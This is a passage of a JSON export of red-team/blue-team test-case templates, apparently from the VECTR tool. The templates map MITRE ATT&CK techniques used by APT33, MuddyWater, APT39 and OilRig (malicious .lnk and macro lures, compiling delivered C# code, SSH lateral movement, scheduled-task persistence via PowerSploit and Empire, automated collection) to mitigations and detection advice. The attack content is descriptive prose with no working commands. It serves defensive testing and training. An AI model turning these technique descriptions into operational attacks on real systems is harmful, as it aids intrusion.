\n\nAs an example, an adversary may weaponize Windows Shortcut Files (.lnk) to bait a user into clicking to execute the malicious payload.(Citation: Proofpoint TA505 June 2018) A malicious .lnk file may contain [PowerShell](https://attack.mitre.org/techniques/T1086) commands. Payloads may be included into the .lnk file itself, or be downloaded from a remote server.(Citation: FireEye APT29 Nov 2018)(Citation: PWC Cloud Hopper Technical Annex April 2017) \n\nWhile User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.","command":"[APT33](https://attack.mitre.org/groups/G0064) has lured users to click links to malicious HTML applications delivered via spearphishing emails.Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.\n---\nApplication whitelisting may be able to prevent the running of executables masquerading as other files.\n---\nIf a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity.\n---\nIf a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious files in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5","relationship--f6cd8be3-3145-4088-ae9d-d006be865c01","relationship--1d1525e6-74f2-447d-ba11-9e9c9c552403","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--225ab1b4-f800-4a92-9949-a0f05fce6213","course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db","relationship--8e567361-e2de-4dc6-b953-ec82dc143f58","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--66551074-a1e3-439c-a996-c1f7ca8136e2","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","relationship--29be2366-5ffb-4499-9984-525f76525326","course-of-action--548bf7ad-e19c-4d74-84bf-84ac4e57f505","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["Dunwoody, M., et al. (2018, November 19). Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign. Retrieved November 27, 2018. https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html","O'Leary, J., et al. (2017, September 20). Insights into Iranian Cyber Espionage: APT33 Targets Aerospace and Energy Sectors and has Ties to Destructive Malware. Retrieved February 15, 2018. https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html","Proofpoint Staff. (2018, June 8). TA505 shifts with the times. Retrieved May 28, 2019. https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times","PwC and BAE Systems. (2017, April). Operation Cloud Hopper: Technical Annex. Retrieved April 13, 2017. https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf","Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019. https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage"],"mitreId":"T1204"},"blueTeam":{"successfulDetectionBehaviors":["Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Block execution of code on a system through application whitelisting, blacklisting, and/or script blocking.","Use intrusion detection signatures to block traffic at network boundaries.","Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.","Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events. Application whitelisting may be able to prevent the running of executables masquerading as other files.\n\nIf a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .lnk, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and RAR that may be used to conceal malicious files in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n\nIf a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity. Solutions can be signature and behavior based, but adversaries may construct files in a way to avoid these systems."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--a7204b51-aa53-43ae-8ab6-84d8583ba422","vectrId":"a7204b51-aa53-43ae-8ab6-84d8583ba422","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"a7204b51-aa53-43ae-8ab6-84d8583ba422","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Compile After Delivery","variant":"MuddyWater - Compile After Delivery","objective":"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)\n","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used the .NET csc.exe tool to compile executables from downloaded C# code.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--cf7b3a06-8b42-4c33-bbe9-012120027925","relationship--663d6fdf-6c99-4ef6-9a4e-bbc8bbe8591f","relationship--efc9bbb8-e606-4fb1-83ae-d74690fd0416","course-of-action--ae56a49d-5281-45c5-ab95-70a1439c338e","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018. https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf","Trend Micro. (2019, February 11). Windows App Runs on Mac, Downloads Info Stealer and Adware. Retrieved April 25, 2019. https://blog.trendmicro.com/trendlabs-security-intelligence/windows-app-runs-on-mac-downloads-info-stealer-and-adware/"],"mitreId":"T1500"},"blueTeam":{"successfulDetectionBehaviors":["This type of technique cannot be easily mitigated with preventive controls or patched since it is based on the abuse of operating system design features. For example, blocking all file compilation may have unintended side effects, such as preventing legitimate OS frameworks and code development mechanisms from operating properly. Consider removing compilers if not needed, otherwise efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to decrypt, deobfuscate, decode, and compile files or information, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--a7d170e9-e5be-488e-aa16-e8823245273d","vectrId":"a7d170e9-e5be-488e-aa16-e8823245273d","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"866d6b69-3f03-4c88-bf51-679a0e4cab74","templateId":"a7d170e9-e5be-488e-aa16-e8823245273d","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Remote Services","variant":"APT39 - Remote Services","objective":"An adversary may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.","command":"[APT39](https://attack.mitre.org/groups/G0087) used secure shell (SSH) to move laterally among their targets.Limit the accounts that may use remote services. Limit the permissions for accounts that are at higher risk of compromise; for example, configure SSH so users can only run specific programs.\n---\nUse multi-factor authentication on remote service logons where possible.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba","relationship--fe8bc44b-805d-440c-a447-96091033439d","relationship--2c0fe330-edcf-4519-a577-c3c9b086d60a","course-of-action--979e6485-7a2f-42bd-ae96-4e622c3cd173","relationship--795ca238-c8cf-4735-98cc-593f1cc59b16","course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317","relationship--a70d8d81-4d88-404c-81f3-c3ddd57d6b69","course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html"],"mitreId":"T1021"},"blueTeam":{"successfulDetectionBehaviors":["Limit the number of accounts that may use remote services. Use multifactor authentication where possible. Limit the permissions for accounts that are at higher risk of compromise; for example, configure SSH so users can only run specific programs. Prevent Credential Access techniques that may allow an adversary to acquire [Valid Accounts](https://attack.mitre.org/techniques/T1078) that can be used by existing services.","Manage the creation, modification, use, and permissions associated to user accounts.","Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--a7f60114-a60b-4c67-ab26-1dfbd0a03fcf","vectrId":"a7f60114-a60b-4c67-ab26-1dfbd0a03fcf","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"a7f60114-a60b-4c67-ab26-1dfbd0a03fcf","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Scheduled Task","variant":"APT33 - Scheduled Task - PowerSploit - Empire","objective":"Utilities such as [at](https://attack.mitre.org/software/S0110) and [schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the remote system. (Citation: TechNet Task Scheduler Security)\n\nAn adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.\n---\n[PowerSploit](https://attack.mitre.org/software/S0194) is an open source, offensive security framework comprised of [PowerShell](https://attack.mitre.org/techniques/T1086) modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, recon, and exfiltration. (Citation: GitHub PowerSploit May 2012) (Citation: PowerShellMagazine PowerSploit July 2014) (Citation: PowerSploit Documentation)\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n","command":"[APT33](https://attack.mitre.org/groups/G0064) has created a scheduled task to execute a .vbe file multiple times a day.\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting tools, like AppLocker, or Software Restriction Policies where appropriate.\n---\nToolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges.\n---\nConfigure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority.\n---\nConfigure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled.\n---\nLimit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems.\n---\n[PowerSploit](https://attack.mitre.org/software/S0194)'s <code>New-UserPersistenceOption</code> Persistence argument can be used to establish via a [Scheduled Task](https://attack.mitre.org/techniques/T1053).\n---\n[Empire](https://attack.mitre.org/software/S0363) has modules to interact with the Windows task scheduler.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["8e4883bf-d7b7-40ac-b157-ab6431c02b03","76ca4ddf-5174-57a7-2842-70d5af62a25c"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9","relationship--9a380085-30dd-4a57-bd52-f85acd584e43","relationship--91e941a6-64bd-42ab-94f9-aa0e90f132ff","course-of-action--f2cb6ce2-188d-4162-8feb-594f949b13dd","relationship--9d4e8b44-90f8-4a10-8419-8187d4babf24","course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8","relationship--8f09085f-c1cf-4321-89c4-17d93e774f6f","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--63c9cdd8-0e64-46dd-9459-3d64828b0cc7","course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3","relationship--1d50b715-96a2-4fd6-bf92-603ad90730fd","course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317","tool--13cd9151-83b7-410d-9f98-25d0f0d1d80d","relationship--91c5d713-a89c-49fa-92eb-abaf18fae988","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--c761f444-3c01-44b4-b8e7-8a26746ce115","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["(Citation: Github PowerShell Empire)","Beechey, J. (2010, December). Application Whitelisting: Panacea or Propaganda?. Retrieved November 18, 2014. http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599","Corio, C., & Sayana, D. P. (2008, June). Application Lockdown with Software Restriction Policies. Retrieved November 18, 2014. http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx","Graeber, M. (2014, July 8). PowerSploit. Retrieved February 6, 2018. http://www.powershellmagazine.com/2014/07/08/powersploit/","Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017. https://twitter.com/leoloobeek/status/939248813465853953","Microsoft. (2005, January 21). Task Scheduler and security. Retrieved June 8, 2016. https://technet.microsoft.com/en-us/library/cc785125.aspx","Microsoft. (2012, June 27). Using Software Restriction Policies and AppLocker Policies. Retrieved April 7, 2016. https://technet.microsoft.com/en-us/library/ee791851.aspx","Microsoft. (2012, November 15). Domain controller: Allow server operators to schedule tasks. Retrieved December 18, 2017. https://technet.microsoft.com/library/jj852168.aspx","Microsoft. (2013, May 8). Increase scheduling priority. Retrieved December 18, 2017. https://technet.microsoft.com/library/dn221960.aspx","Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019. https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events","Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017. https://technet.microsoft.com/library/dd315590.aspx","NSA Information Assurance Directorate. (2014, August). Application Whitelisting Using Microsoft AppLocker. Retrieved March 31, 2016. https://www.iad.gov/iad/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm","PowerShellMafia. (2012, May 26). PowerSploit - A PowerShell Post-Exploitation Framework. Retrieved February 6, 2018. https://github.com/PowerShellMafia/PowerSploit","PowerSploit. (n.d.). PowerSploit. Retrieved February 6, 2018. http://powersploit.readthedocs.io","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016. https://technet.microsoft.com/en-us/sysinternals/bb963902","Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017. https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019. https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf","Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016. http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html"],"mitreId":"T1053"},"blueTeam":{"successfulDetectionBehaviors":["Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. (Citation: Powersploit)\n\nConfigure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. (Citation: TechNet Server Operator Scheduled Task)\n\nConfigure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. (Citation: TechNet Scheduling Priority)\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)","Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.","Manage the creation, modification, use, and permissions associated to user accounts."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--a92806c4-f7eb-45e1-844b-c3147f1a7468","vectrId":"a92806c4-f7eb-45e1-844b-c3147f1a7468","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"a92806c4-f7eb-45e1-844b-c3147f1a7468","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"User Execution","variant":"OilRig - User Execution","objective":"An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. \n\nAs an example, an adversary may weaponize Windows Shortcut Files (.lnk) to bait a user into clicking to execute the malicious payload.(Citation: Proofpoint TA505 June 2018) A malicious .lnk file may contain [PowerShell](https://attack.mitre.org/techniques/T1086) commands. Payloads may be included into the .lnk file itself, or be downloaded from a remote server.(Citation: FireEye APT29 Nov 2018)(Citation: PWC Cloud Hopper Technical Annex April 2017) \n\nWhile User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has delivered malicious links and macro-enabled documents that required targets to click the \"enable content\" button to execute the payload on the system.Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.\n---\nApplication whitelisting may be able to prevent the running of executables masquerading as other files.\n---\nIf a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity.\n---\nIf a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious files in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5","relationship--557d3feb-0699-429e-bc83-ff114cf138ef","relationship--1d1525e6-74f2-447d-ba11-9e9c9c552403","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--225ab1b4-f800-4a92-9949-a0f05fce6213","course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db","relationship--8e567361-e2de-4dc6-b953-ec82dc143f58","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--66551074-a1e3-439c-a996-c1f7ca8136e2","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","relationship--29be2366-5ffb-4499-9984-525f76525326","course-of-action--548bf7ad-e19c-4d74-84bf-84ac4e57f505","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Dunwoody, M., et al. (2018, November 19). Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign. Retrieved November 27, 2018. https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html","Lee, B., Falcone, R. (2018, February 23). OopsIE! OilRig Uses ThreeDollars to Deliver New Trojan. Retrieved July 16, 2018. https://researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/","Lee, B., Falcone, R. (2018, July 25). OilRig Targets Technology Service Provider and Government Agency with QUADAGENT. Retrieved August 9, 2018. https://researchcenter.paloaltonetworks.com/2018/07/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/","Meyers, A. (2018, November 27). Meet CrowdStrike’s Adversary of the Month for November: HELIX KITTEN. Retrieved December 18, 2018. https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-november-helix-kitten/","Proofpoint Staff. (2018, June 8). TA505 shifts with the times. Retrieved May 28, 2019. https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times","PwC and BAE Systems. (2017, April). Operation Cloud Hopper: Technical Annex. Retrieved April 13, 2017. https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf"],"mitreId":"T1204"},"blueTeam":{"successfulDetectionBehaviors":["Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Block execution of code on a system through application whitelisting, blacklisting, and/or script blocking.","Use intrusion detection signatures to block traffic at network boundaries.","Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.","Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events. Application whitelisting may be able to prevent the running of executables masquerading as other files.\n\nIf a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .lnk, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and RAR that may be used to conceal malicious files in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n\nIf a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity. Solutions can be signature and behavior based, but adversaries may construct files in a way to avoid these systems."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--abce7871-5154-443b-b335-f2f73d35451b","vectrId":"abce7871-5154-443b-b335-f2f73d35451b","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","templateId":"abce7871-5154-443b-b335-f2f73d35451b","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Automated Collection","variant":"OilRig - Automated Collection","objective":"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of [Scripting](https://attack.mitre.org/techniques/T1064) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Remote File Copy](https://attack.mitre.org/techniques/T1105) to identify and move files.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used automated collection.Encryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other means. Strong passwords should be used on certain encrypted documents that use them to prevent offline cracking through [Brute Force](https://attack.mitre.org/techniques/T1110) techniques.\n---\nEncryption and off-system storage of sensitive information may be one way to mitigate collection of files, but may not stop an adversary from acquiring the information if an intrusion persists over a long period of time and the adversary is able to discover and access the data through other 